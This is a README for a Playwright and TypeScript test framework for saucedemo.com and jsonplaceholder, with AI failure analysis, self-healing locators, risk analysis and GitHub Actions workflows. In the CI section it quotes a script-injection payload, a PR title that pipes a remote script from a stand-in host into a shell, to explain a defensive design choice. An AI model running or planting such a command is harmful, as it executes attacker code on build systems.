# Saucedemo — Playwright Test Automation Framework

AI-augmented QA project — risk analysis, test generation, self-healing
locators, and AI failure analysis all run for real in this repo's CI, not
as demo stubs.

A production-style test automation framework built with Playwright and TypeScript,
covering UI end-to-end tests for [saucedemo.com](https://www.saucedemo.com)
and REST API tests for [jsonplaceholder.typicode.com](https://jsonplaceholder.typicode.com).

---

## 📋 Table of Contents

- [Tech Stack](#-tech-stack)
- [Project Structure](#-project-structure)
- [Architecture Principles](#-architecture-principles)
- [Getting Started](#-getting-started)
- [Running Tests](#-running-tests)
- [AI Failure Analysis](#-ai-failure-analysis)
- [Self-Healing Audit Trail](#-self-healing-audit-trail)
- [AI Test Generation](#-ai-test-generation)
- [Risk Analysis & Impact-Based Test Selection](#-risk-analysis--impact-based-test-selection)
- [CI/CD — GitHub Actions](#-cicd--github-actions)
- [Reporting](#-reporting)
- [Test Users](#-test-users-saucedemo)
- [API Reference](#-api-reference-jsonplaceholder)

---

## 🛠 Tech Stack

| Tool | Version | Purpose |
| --- | --- | --- |
| [Playwright](https://playwright.dev) | ^1.61.0 | Browser automation + API testing |
| [TypeScript](https://www.typescriptlang.org) | ^5.x | Type-safe test code |
| [@faker-js/faker](https://fakerjs.dev) | ^8.4.1 | Test data generation |
| [Allure Playwright](https://allurereport.org) | ^3.10.2 | Test reporting |
| [ESLint](https://eslint.org) + [typescript-eslint](https://typescript-eslint.io) | ^10.x / ^8.x | Lint — required check in CI, run before every push |
| [GitHub Actions](https://github.com/features/actions) | — | CI/CD pipeline |
| [Docker](https://www.docker.com) | — | Consistent browser environment in CI |
| [Groq API](https://console.groq.com) | — | Self-healing locators, risk analysis, live-page generation |
| [Claude Code](https://claude.com/product/claude-code) CLI | — | Failure analysis + test generation (subprocess, subscription auth) |

---

## 📁 Project Structure

```
project/
│
├── tests/
│   ├── pages/                       ← Page Objects (one class = one file)
│   │   ├── basePage.ts                 Abstract base: goto(), waitForPageLoad(), getTextOf()
│   │   ├── loginPage.ts                Login form
│   │   ├── inventoryPage.ts            Product catalog
│   │   ├── itemDetailPage.ts           Single product detail page
│   │   ├── cartPage.ts                 Shopping cart
│   │   ├── checkoutPage.ts             Checkout flow (3 steps)
│   │   └── index.ts                    Barrel export
│   │
│   ├── fixtures/                    ← Fixtures (one file = one responsibility)
│   │   ├── auth.fixture.ts             standardPage, problemPage via localStorage
│   │   ├── api.fixture.ts              APIRequestContext for jsonplaceholder.typicode.com
│   │   ├── pages.fixture.ts            Page Objects as fixtures (depends on auth)
│   │   ├── healing.fixture.ts          Self-healing heal() fixture (Groq)
│   │   └── index.ts                    mergeTests → export { test, expect }
│   │
│   ├── builders/                    ← Data Builders (faker under the hood)
│   │   ├── shippingInfo.builder.ts     Checkout form data with fluent API
│   │   ├── post.builder.ts             /posts endpoint request data
│   │   └── index.ts                    Barrel export
│   │
│   ├── types/                       ← TypeScript types
│   │   └── api.types.ts                Post, Comment, User, Todo
│   │
│   ├── .auth/                       ← storageState files (.gitignore)
│   │
│   └── specs/                       ← Tests organized by feature
│       ├── auth.setup.ts               Global setup — saves storageState to .auth/
│       ├── features/                   UI tests (project: sd-e2e)
│       │   ├── login.spec.ts
│       │   ├── inventory.spec.ts
│       │   ├── inventory.healing.spec.ts  Self-healing locator demo
│       │   ├── itemDetail.spec.ts
│       │   ├── cart.spec.ts
│       │   └── checkout.spec.ts
│       └── api/                        API tests (project: jp-api)
│           └── api.spec.ts
│
├── helpers/                         ← Logic behind scripts/ (one module = one responsibility)
│   ├── groq/                           Groq API client + prompt builders
│   │   ├── client.ts
│   │   └── prompts/                    selfHealing · riskAnalysis · generateTests (the last one
│   │                                      only for generateFromLivePage.ts now, see below)
│   ├── claude/                         Claude Code CLI subprocess client — same shape as groq/,
│   │   ├── client.ts                     used for failure analysis + test generation (self-
│   │   └── prompts/                      healing/risk analysis stay on Groq) — see §§ AI Failure
│   │                                      Analysis / AI Test Generation
│   ├── analyzeFailure/                 Collect → dedupe/cache → analyze → report (client-agnostic —
│   │                                    takes any { ask() } client + prompt builder, see core.ts)
│   ├── generateTests/                  Feature description → generated spec file (client-agnostic,
│   │                                    same pattern as analyzeFailure/ — prompt lives in claude/prompts/)
│   ├── selfHealing/                    Locator failed → AI picks alternative from DOM snapshot
│   │   ├── core.ts                        heal() — logs + Allure-tags every attempt (see log.ts/reporter.ts)
│   │   ├── log.ts                         JSONL log of every healing attempt (test-results/self-healing-log.jsonl)
│   │   └── reporter.ts                    JSONL → self-healing-summary.md
│   ├── riskAnalysis/                   Diff + impacted specs → Groq risk report
│   ├── testSelection/                  Static import graph → impacted specs (no AI)
│   └── git/                            git diff helper shared by risk/selection scripts
│
├── scripts/                         ← CLI entry points (thin wrappers around helpers/)
│   ├── analyzeFailure.ts               AI root-cause analysis via the Claude Code CLI
│   │                                        (analyze:failures) — see § AI Failure Analysis
│   ├── generateTests.ts                AI test-case generation via the Claude Code CLI (ai:generate)
│   ├── generateFromLivePage.ts          Generate for any URL, no Page Object needed (ai:generate:live)
│   │                                        — still on Groq, see § AI Test Generation
│   ├── analyzeRisk.ts                  AI pre-merge risk analysis (ai:risk)
│   ├── selectTests.ts                  Impact-based regression selection (ai:select)
│   └── summarizeHealing.ts             Self-healing audit report (healing:summary); with a
│                                        directory arg, merges per-shard logs into one (CI-only)
│
├── .github/
│   ├── workflows/
│   │   ├── pr-checks.yml               on: pull_request — lint + @smoke gate + risk-analysis
│   │   ├── on-merge.yml                on: push to main — publish-allure/notify-telegram, no re-test
│   │   └── full-regression.yml         on: workflow_dispatch — heavy suite, never gates a PR
│   └── scripts/                        Notification/cleanup logic — kept out of the YAML
│       ├── notify-telegram.sh             Untrusted values arrive via env, never spliced into the script
│       ├── find-pr-run.js                 push → the PR run that already tested this code
│       ├── cleanup-artifacts.js
│       └── runRegression.sh               npm run regression — local counterpart to full-regression.yml
├── eslint.config.mjs                ← flat config, no-semicolons house style (npm run lint)
├── playwright.config.ts
├── package.json
└── .gitignore
```

---

## 🏗 Architecture Principles

### 1. Locators live only in Page Objects

```ts
// ❌ Never — locator in a test
await page.locator('[data-test="add-to-cart-sauce-labs-backpack"]').click()

// ✅ Always — method from Page Object
await inventoryPage.addToCart('sauce-labs-backpack')
```

### 2. Fixtures do not contain assertions

```ts
// ❌ Wrong — expect() inside a fixture
inventoryPage: async ({ standardPage }, use) => {
  await expect(standardPage.locator('.inventory_list')).toBeVisible()
  await use(new InventoryPage(standardPage))
}

// ✅ Correct — only setup, no assertions
inventoryPage: async ({ standardPage }, use) => {
  const ip = new InventoryPage(standardPage)
  await ip.inventoryList.waitFor({ state: 'visible' })
  await use(ip)
}
```

### 3. Single import in every test file

```ts
// ✅ Always import from one place
import { test, expect } from '../../fixtures'
```

### 4. Data Builders instead of hardcoded values

```ts
// ❌ Fragile — breaks if field names change
{ firstName: 'John', lastName: 'Doe', postalCode: '12345' }

// ✅ Flexible — random data, override only what matters
new ShippingInfoBuilder().build()
new ShippingInfoBuilder().withEmptyFirstName().build()
new PostBuilder().withUserId(1).build()
```

### 5. No dynamic imports

```ts
// ❌ Breaks with "module": "commonjs" in tsconfig
const { CartPage } = await import('../../pages')

// ✅ Static import at the top of the file
import { CartPage, CheckoutPage } from '../../pages'
```

### 6. No semicolons

```ts
// ❌ semi: ['error', 'never'] — fails lint
const total = await checkoutPage.getSummaryTotal();

// ✅
const total = await checkoutPage.getSummaryTotal()
```

Enforced by ESLint (`npm run lint`), not just convention — see
[eslint.config.mjs](eslint.config.mjs). Required check in CI.

---

## 🚀 Getting Started

### Prerequisites

- Node.js 18+
- npm 9+

### Installation

```bash
# Clone the repository
git clone https://github.com/your-username/saucedemo-playwright.git
cd saucedemo-playwright

# Install dependencies
npm install

# Install Playwright browsers
npx playwright install chromium
```

### Environment variables

Create a `.env` file in the project root:

```bash
cp .env.example .env
```

```env
# Groq API key — self-healing, risk analysis, and live-page generation
# (ai:generate:live). Free at console.groq.com
GROQ_API_KEY=gsk_...

# Claude subscription OAuth token — failure analysis (analyze:failures) and
# test generation (ai:generate) run through the Claude Code CLI, not a
# billed API key. Generate with: claude setup-token
CLAUDE_CODE_OAUTH_TOKEN=sk-ant-oat01-...
```

---

## ▶️ Running Tests

```bash
# Run all tests
npm test

# Run only UI tests (saucedemo.com)
npm run test:e2e

# Run only API tests (jsonplaceholder.typicode.com)
npm run test:api

# Interactive UI mode — best for local development
npx playwright test --ui

# Run a specific spec file
npx playwright test specs/features/checkout.spec.ts

# Run tests matching a name pattern
npx playwright test --grep "sorting"

# Debug mode — step through actions
npx playwright test --debug

# Record new tests with Codegen
npx playwright codegen https://www.saucedemo.com
```

---

## 🤖 AI Failure Analysis

When tests fail, the AI script reads `test-results/*/error-context.md` and
sends it to the [Claude Code](https://claude.com/product/claude-code) CLI
(`helpers/claude/`) for root cause analysis — a subprocess call
(`claude -p`) authenticated with a Pro/Max subscription's
`CLAUDE_CODE_OAUTH_TOKEN`, not a separately billed API key. Self-healing and
risk analysis are unaffected — those stay on Groq (`helpers/groq/`). Test
generation (`ai:generate`) later moved the same way — see § AI Test
Generation — since both paths are low-frequency (once or a few times a run,
never inside a live test's timeout budget) and benefit most from a stronger
reasoning model.

```bash
# Run manually after a test failure
npm run analyze:failures
```

In CI, this runs automatically on failure and outputs a collapsible group
in GitHub Actions logs:

```
▶ AI Analysis: checkout flow — full purchase cycle
  ## Manual Verdict
  🔴 Product bug
  The order confirmation never appeared after a valid checkout — this
  looks like a real defect, not a flaky test.

  ## Root Cause
  The test expected "Thank you for your order!" but the page never
  reached /checkout-complete.html — the Finish button was not clickable.

  ## Location
  checkout.spec.ts:89 — checkoutPage.finish()

  ## Fix
  1. Wait for finishButton to be visible before clicking
  2. Verify summaryTotal is rendered before proceeding

  ## Code
  await expect(checkoutPage.finishButton).toBeVisible()
  await checkoutPage.finish()
```

### Manual Verdict: a second audience for the same analysis

`Root Cause`/`Location`/`Fix`/`Code` is written for whoever maintains the
automation — useless to a manual tester deciding whether a red run is worth
filing a bug for. Every analysis leads with a `Manual Verdict` instead,
answering that one question in plain language, no code: **🔴 product bug**,
**🟡 test/environment issue** (locator drift, timing, flaky infra — not a
defect), or **🟠 unclear, needs a human look**.

`ai-analysis-summary.md` rolls every failure's verdict up into its own
section near the top, and `notify-telegram.sh` pulls *that* — not a blind
first-lines grab — into the Telegram message, so the verdict is the first
thing anyone sees without opening GitHub Actions at all.

---

## 🩹 Self-Healing Audit Trail

A healed test still passes — but it passed on a locator the AI (or the local
fallback) guessed, not the one the Page Object declares. Left unflagged, that
pass is indistinguishable from a normal one in any report, which is a real
risk once humans (manual QA, reviewers) start trusting the report as-is: a
UI change that *should* fail a test can slip through as green if a
plausible-enough element still matches the description.

Every `heal()` call that actually had to recover a locator (not just "checked
and it was fine") is:

- **Logged** to `test-results/self-healing-log.jsonl` — test, description,
  original vs. healed selector, method (`ai` or `fallback`), and whether it
  succeeded at all.
- **Tagged in Allure** — `tag('self-healing')` plus `healed` / `heal-method`
  labels and a `self-healing.json` attachment on the test, so Allure's own
  filters can answer "show me every test that only passed via healing this
  run" without reading logs.

After a run, turn the log into a report:

```bash
npm run healing:summary
```

Output — `self-healing-summary.md`:

```
## ✅ Healed
| Test | Description | Original selector | Via | New selector |
|---|---|---|---|---|
| inventory.healing.spec.ts: ... | Add to cart button for ... | [data-test="btn-add-..."] | ai | [data-test="add-to-cart-..."] |

## ❌ Could not heal
| Test | Description | Original selector |
```

### In CI: posted on the PR, not buried in a job summary

`test-e2e-smoke` posts its own log straight from `summarizeHealing.ts` as a
sticky PR comment (`marocchino/sticky-pull-request-comment`, same mechanism
as `risk-analysis`, own comment/header so the two don't collide) — updated
in place on every push, not a new comment each time. `full-regression.yml`
has no PR to comment on (`workflow_dispatch`, not PR-triggered), so its
sharded run just uploads each shard's summary as an artifact instead —
`summarizeHealing.ts`'s directory-argument mode exists for exactly this
case, when someone wants one merged view across shards after the fact.

In CI this runs after every E2E shard (`if: always()` — a healed test can
still pass, so this isn't gated on failure), and the artifact is retained
alongside the AI failure-analysis reports. Treat a run with entries here the
same way you'd treat a skipped assertion: not a failure, but a flag that a
Page Object selector has drifted and is due a real fix.

---

## ✨ AI Test Generation

The Claude Code CLI (`helpers/claude/`) generates a first-draft spec file
from a feature description (`helpers/generateTests/features.ts`) — same
subscription-authenticated subprocess as failure analysis, same reasoning
for why it moved off Groq (see § AI Failure Analysis). Covers both domains —
UI (Page Object driven) and API (jsonplaceholder) — each with its own
prompt context, since the two need completely different rules
(locators/fixtures vs. HTTP client/response shapes).
`helpers/generateTests/generator.ts` is client-agnostic (any `{ ask() }`
client + prompt source), the same pattern as `helpers/analyzeFailure/core.ts`.

```bash
npm run ai:generate              # all features (login, inventory, checkout, api)
npm run ai:generate:login
npm run ai:generate:inventory
npm run ai:generate:checkout
npm run ai:generate:api
```

Output goes to `tests/specs/generated/` — reviewed and run there, separately
from the maintained suite, via two dedicated Playwright projects (not part of
`npm test`):

```bash
npm run test:generated           # UI specs (sd-e2e-generated project)
npm run test:generated:api       # API specs (jp-api-generated project)
```

Treat the output as a draft, not a finished test: it's a fast starting point
for a brand-new feature, or for one targeted test off a `ai-risk-analysis.md`
coverage gap — not a replacement for a hand-designed spec. In this repo the
hand-written `checkout.spec.ts` / `login.spec.ts` are still the reference
quality bar (e.g. they deliberately exercise both the healed and non-healed
path of every interaction, which a generated first draft won't think to do
without being told).

### Self-correcting on type errors

A generation can ignore an instruction that's already spelled out in the
prompt — e.g. importing `ShippingInfoBuilder` from `'../../pages'` when the
prompt explicitly says `'../../builders'`. Rather than leave that for a
human to catch, `scripts/generateTests.ts` typechecks the file it just wrote
(`helpers/generateTests/validator.ts`, scoped to that file's `tsc` output)
and, on failure, sends the exact errors back to Claude for a targeted fix —
up to 2 attempts before it gives up and says so. This only catches
compiler-visible mistakes, not wrong assumptions about app behavior the
prompt never documented (that class of bug still needs a human to notice
and add the missing fact to the prompt, same as any other spec gap).

### Generating for a page with no Page Object at all

`ai:generate` above only works because this project's entire Page Object
layer is spelled out by hand in its prompt — it can't generate anything for
a page it has no description of. `scripts/generateFromLivePage.ts` is a
different tool for that case: it visits a URL live, captures a real
accessibility snapshot (`helpers/selfHealing/snapshot.ts` — the same
mechanism self-healing already uses to find elements at runtime), and asks
Groq to write a self-contained spec from that snapshot alone — no Page
Object, no fixtures, nothing this project needs to already know about the
target.

```bash
npm run ai:generate:live -- <url> "<task description>"
```

Verified against three unrelated pages with three different interaction
patterns — a login form with redirects, unlabeled checkboxes, and
dynamically added/removed elements — all three generated tests passed
against the live site on the first attempt, no fixes needed.

This is a draft-generation tool, not a replacement for `ai:generate`:
useful the moment you're pointed at a page with no suite yet, disposable
once one exists. On a real project, the natural next step past this is
Claude with Playwright MCP directly — it drives the browser the same way,
but already knows the project's context from the codebase itself, with no
prompt to hand-author at all.

---

## 🎯 Risk Analysis & Impact-Based Test Selection

Two AI-adjacent scripts that run **before** you push, not after a test fails.

### Impact-based test selection (deterministic, no AI)

`scripts/selectTests.ts` builds a static import graph of every spec file
(`tests/pages`, `tests/fixtures`, `tests/builders`, `helpers/*`) and figures out
which specs actually depend on what changed — no LLM call, no guessing.
A CI gate that decides *what to run* needs to be exact, not probabilistic;
that's a job for plain static analysis, not AI.

```bash
npm run ai:select              # compares against origin/main (or uncommitted changes)
npm run ai:select -- main      # explicit base ref
```

Output: the list of impacted specs, a ready-to-run `npx playwright test ...`
command, and `impacted-specs.txt` for CI to consume. Touching shared config
(`playwright.config.ts`, `package.json`, `tsconfig.json`) always triggers a
full regression instead of a partial one.

### Risk analysis (Groq)

`scripts/analyzeRisk.ts` takes the same diff, cross-references it against the
impacted-specs result above, and asks Groq for a **judgment call** the graph
can't make on its own: which changes are actually risky, and which changed
code has *no* spec covering it at all.

```bash
npm run ai:risk                # compares against origin/main (or uncommitted changes)
npm run ai:risk -- main        # explicit base ref
```

Output — `ai-risk-analysis.md`:

```
## Risk Summary
## Affected User Flows
## Regression Risk Areas       (High/Medium/Low, with reasoning)
## Coverage Gaps                ← changed code with no existing test
## Recommended New Test Cases   ← feed straight into `npm run ai:generate`
```

The split is deliberate: **static analysis decides what to run** (fast, exact,
safe to gate CI on), **AI decides what's risky and untested** (fuzzy judgment,
meant for a human to read, not to auto-block a merge on).

### In CI: advisory only, never a gate

On every pull request, a `risk-analysis` job runs `ai:risk` against the PR's
base branch and posts (and keeps updating) the result as a PR comment —
`continue-on-error: true`, so a Groq hiccup never fails the PR. It does **not**
replace the full E2E/API regression, and `ai:select` is *not* wired into CI at
all — deliberately: this repo's fixtures barrel-export everything through one
`tests/fixtures/index.ts`, so most changes already touch 6/7 specs, making
selective test running here save little while risking a silently-skipped
regression. `ai:select` stays a local, pre-push convenience command.

---

## 🔄 CI/CD — GitHub Actions

Tests run once per change, on the PR — **not again** when it merges. The
merge reuses the PR run's artifacts instead of re-testing.

This is three separate workflow files, each with its own trigger, rather
than one file with `if: github.event_name == ...` guards scattered through
every job — a job belongs to exactly one pipeline, and its file's trigger is
the only place that's decided:

- **[`pr-checks.yml`](.github/workflows/pr-checks.yml)** — `on: pull_request`.
  The merge gate — but only a **smoke subset**, tests tagged `@smoke` (one
  per critical flow: login, add-to-cart, cart navigation, product detail
  navigation, a full checkout, an API CRUD chain), not the whole suite. Two
  reasons, not just speed: this repo tests a third-party app it doesn't
  control (saucedemo.com, jsonplaceholder), so an unrelated outage there
  would otherwise block every PR the same way — smaller gate surface, less
  exposure. The full suite still runs, just not as a PR gate — see
  `full-regression.yml` below. (A known, real trade-off: some regressions
  that a full PR-gate run would catch are now only caught by
  `full-regression.yml`, not on every PR — that was the deliberate call
  here, not an oversight.)
- **[`on-merge.yml`](.github/workflows/on-merge.yml)** — `on: push` to `main`.
  Doesn't re-run tests *or* publish a report — a merge only happens once
  `pr-checks.yml` already passed, so there's nothing new to show. Just a
  short "PR #N merged, checks were green" Telegram note. Kept on `push`
  rather than `pull_request: closed` — GitHub's `github-pages` environment
  (used below, by `full-regression.yml`) only allows deploys from a real
  branch ref (`refs/heads/main`); `pull_request` events, even on close,
  always report the ephemeral `refs/pull/N/merge` ref instead.
- **[`full-regression.yml`](.github/workflows/full-regression.yml)** —
  `on: workflow_dispatch` only, never gates anything. The CI counterpart to
  `npm run regression` below, and the *only* place that (re)publishes the
  Allure report — runs the whole suite fresh, on demand, and sends its own
  Telegram summary. This is where a heavy suite belongs once it outgrows the
  PR gate — a safety net you trigger by hand (or, later, on a schedule),
  decoupled from any single PR.

### Pipeline overview

```
pr-checks.yml (on: pull_request)            on-merge.yml (on: push to main)
    │                                          │
    ├── lint            → required, seconds    ├── find-pr-run
    │                                          │     └── resolves which
    ├── test-e2e-smoke  → required, @smoke     │        pr-checks.yml run
    │     └── the actual gate, ~6 tests        │        tested this exact
    │     └── posts self-healing summary       │        code (any merge
    │          as a PR comment                 │        strategy)
    │                                          │
    ├── test-api-smoke  → required, @smoke     └── notify-telegram
    │                                                → "PR #N merged,
    ├── risk-analysis  → advisory, never             checks were green"
    │     blocks (continue-on-error)                 — no report, no
    │     └── posted/updated as a PR comment          re-test
    │
    └── cleanup
          → deletes this run's old artifacts

full-regression.yml (on: workflow_dispatch)
    │
    ├── test-e2e (4 shards) + test-api  → the FULL suite, fresh run
    ├── publish-allure                  → GitHub Pages (only place this happens)
    └── notify-telegram                 → full status + Allure link + AI snippet
```

`lint`, `test-e2e-smoke` and `test-api-smoke` are the required checks — the
actual merge gate, scoped to tests tagged `@smoke`
(`npx playwright test --grep @smoke`). `risk-analysis` is advisory only.
`ai:select` is deliberately *not* wired into CI at all — see [Risk Analysis
& Impact-Based Test Selection](#-risk-analysis--impact-based-test-selection)
for why (in short: this repo's shared fixture barrel means most changes
already touch nearly every spec, so import-graph selection wouldn't narrow
much here — a fixed `@smoke` tag set was the more honest fit).

If `find-pr-run` can't resolve a PR for the push (e.g. someone pushed to
`main` directly, bypassing review), `notify-telegram` no-ops rather than
guess — see [`find-pr-run.js`](.github/scripts/find-pr-run.js).

Want to run the full suite + Allure + Telegram notification on demand?
`npm run regression` does exactly that locally — see
[`runRegression.sh`](.github/scripts/runRegression.sh) — and
`full-regression.yml` does the same thing in CI, from the Actions tab's "Run
workflow" button.

Notification and cleanup logic lives in `.github/scripts/`, not inline in the
YAML — `notify-telegram.sh` in particular takes untrusted values (PR title,
etc.) as env vars rather than `${{ }}`-interpolating them into the shell
script text, which is a real GitHub Actions script-injection vector otherwise
(a PR titled `` $(curl evil.sh | sh) `` would execute as shell if spliced in
directly).

### Projects

| Project | Test directory | Base URL |
| --- | --- | --- |
| `setup` | `specs/auth.setup.ts` | saucedemo.com |
| `sd-e2e` | `specs/features/` | saucedemo.com |
| `jp-api` | `specs/api/` | jsonplaceholder.typicode.com |

### CI environment variables

`CI=true` activates in `playwright.config.ts`:
- `headless: true`
- `retries: 2`
- `maxFailures: 10`
- `reporter: blob` (for shard merging)

### Required GitHub Secrets

```
Settings → Secrets and variables → Actions → New repository secret

GROQ_API_KEY          — self-healing + risk analysis (free at console.groq.com) — the only
                        two AI paths CI actually runs; ai:generate/ai:generate:live are
                        local-only, never wired into a workflow
CLAUDE_CODE_OAUTH_TOKEN — AI failure analysis (from a Claude subscription — run `claude setup-token`)
TELEGRAM_BOT_TOKEN    — Telegram notifications
TELEGRAM_CHAT_ID      — Telegram chat or channel ID
```

### Artifacts

| Artifact | When uploaded | Contents |
| --- | --- | --- |
| `playwright-report-e2e` | Always | Merged HTML report from all shards |
| `allure-results-shard-*` | Always | Raw Allure data per shard |
| `ai-analysis-shard-*` | On failure | AI root cause analysis |
| `test-artifacts-shard-*` | On failure | Screenshots, traces, videos |

---

## 📊 Reporting

### Playwright HTML Report

```bash
npm run report:pw
```

### Allure Report

```bash
# Generate report from allure-results/
npm run allure:gen

# Open the generated report
npm run allure:open

# Generate and open in one command
npm run allure:report
```

In CI, Allure is published to **GitHub Pages** after every run:
```
https://<username>.github.io/<repo>/
```

---

## 👤 Test Users (saucedemo)

All users share the same password: `secret_sauce`

| Username | Behavior |
| --- | --- |
| `standard_user` | Everything works normally |
| `locked_out_user` | Cannot log in — sees lockout error |
| `problem_user` | UI bugs (broken images, wrong sort) |
| `performance_glitch_user` | Login takes ~5 seconds |

---

## 🔌 API Reference (jsonplaceholder)

Base URL: `https://jsonplaceholder.typicode.com/`

> **Note:** All paths are without leading slash — required because `baseURL` ends with `/`.
> `'posts'` resolves to `https://jsonplaceholder.typicode.com/posts` ✅
> `'/posts'` resolves to `https://jsonplaceholder.typicode.com/posts` but loses the base path in some contexts ❌

| Resource | Count | Description |
| --- | --- | --- |
| `posts` | 100 | Posts (userId 1–10) |
| `comments` | 500 | Comments (postId 1–100) |
| `users` | 10 | Users |
| `todos` | 200 | Todos (userId 1–10) |
| `albums` | 100 | Albums (userId 1–10) |

All HTTP methods supported: `GET`, `POST`, `PUT`, `PATCH`, `DELETE`.
Write operations are simulated — data is not persisted.

---

## 📦 Scripts Reference

```bash
# Tests
npm test                      # all projects
npm run test:e2e              # UI tests only
npm run test:api              # API tests only
npm run test:generated        # generated UI specs (review before promoting)
npm run test:generated:api    # generated API specs (review before promoting)

# Lint
npm run lint                  # eslint . — recommended before every push, alongside ai:risk/ai:select

# Reports
npm run report:pw             # open Playwright HTML report
npm run allure:gen            # generate Allure report
npm run allure:open           # open Allure report
npm run allure:report         # generate + open

# AI
npm run analyze:failures       # analyze latest test failures via the Claude Code CLI
npm run ai:risk                # pre-merge risk analysis of the current diff
npm run ai:select              # impact-based test selection (deterministic)
npm run ai:generate            # generate spec files for all features via the Claude Code CLI
npm run ai:generate:api        # generate spec file for the API suite only
npm run ai:generate:live       # generate for any live URL, no Page Object needed — still via Groq
npm run healing:summary        # build self-healing-summary.md from this run's healing log
```